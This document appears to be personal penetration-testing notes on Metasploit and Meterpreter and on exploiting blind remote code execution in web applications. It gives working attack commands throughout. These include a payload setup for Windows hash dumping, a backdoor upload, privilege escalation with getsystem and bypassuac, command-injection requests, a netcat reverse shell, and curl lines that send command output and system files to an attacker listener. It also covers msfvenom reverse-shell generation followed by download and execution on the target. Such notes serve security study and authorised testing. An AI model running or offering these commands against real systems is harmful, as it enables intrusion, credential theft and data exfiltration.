#Metasploit notes
1. use exploit > show payloads > set payload > show options > exploit

Keep it updated: `msfupdate`
`service postgresql start`
`service metasploit start`

Example:

`msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp`

(meterpreter is a payload)

#Meterpreter

msf> search meterpreter
msf exploit(explmod) > set payload windows/meterpreter/reverse_tcp

- Bind and Reverse

 - bind_tcp runs server process on target machine that waits for connections from the attacker machine.
 - reverse_tcp performs TCP connection back to attacker. (backdoor to evade firewalls)

- Sessions
 - to run multiple meterpreter sessions (multiple shells) on the target.
 - to resume a background session use the sessions -i 1 command
`sysinfo`
`getuid`
 - bypass user account control `bypassuac` in windows
after > `getuid`
#hashdump 
`msf> use post/windows/gather/hashdump`

`meterpreter > upload /root/backdoor.exe C:\\Windows`

#standard shell 

#go back to session with (resume background session)
`sessions -i 1`
#after shell
`sysinfo`
#list currently opened sessions 
`sessions -l`
#Priv Esc
`getsystem`
#modern Windows (getsystem not gonna work)
use bypassuac module.
> show options > set session 1
#RCE Vuln

#Beyond RCE 
- for blind RCE:
- delay requests and observe application response
`GET /script.php?c=sleep+3&ok=ok HTTP/1.1`
Start Wireshark to intercept ping requests. Filter for ICMP. 
In Burp- attempt to ping within vulnerable parameter:
`GET /script.php?c=ping 192.168.139.130 -c &ok=ok HTTP/1.1`
 - use burp URL-encode key characters
#Attempt to upload tools to remote webapp:
echo $PATH (to get executable locations)
which nc
which python
which curl
which wget
#If netcat is installed on remote machine
- In linux /var/www/html/server nc -lvp 53
- On web page search: nc <remote host IP> -e /bin/bash
#If curl is installed on remote machine
- In linux `nc -lvp 53`
- On webpage `curl http://<remote host IP>:53`
- If it works- on webpage: `curl http://<remote host IP>:53/`whoami`
- Try to get id onn webpage: `curl http://<remote host IP>:53/`id | base64`
  - Decode on linux: `echo "djdshfhhs" | base64 -d`
#Using curl to transfer files:
- In linux `nc -lvp 53`
- On webpage `curl http://192.168.139.130:53/file -T /etc/issue`
- Transfer file to remote system:
  - Navigate to `/var/www/html/server` 
  - `python -m SimpleHTTPServer 9090`
  - Create reverse shell payload using msfvenom
    - `msfvenom -p linux/x64/shell_reverse_tcp lhost=<local IP> lport=53 -f elf -o reverse53`
    - Download file into remote system
    - `python -m SimpleHTTPServer 9090`
    - In browser search `curl http://<remote host IP>:9090/reverse53 -o /tmp/r`
    - If shell successfully downloaded: `chmod +x /tmp/r` in browser
    - In browser: `curl http://<remote host IP>:9090 -T /tmp/r` to check if the reverse shell file is there.
    - Last step: RUN IT. In linux `nc -lvp 53`
	- In browser search `/tmp/r`
        - should grant reverse shell
    - Upgrade shell with either `bash -i` or use python to spawn a TTY Shell `python -c 'import pty; pty.spawn("/bin/sh")'`


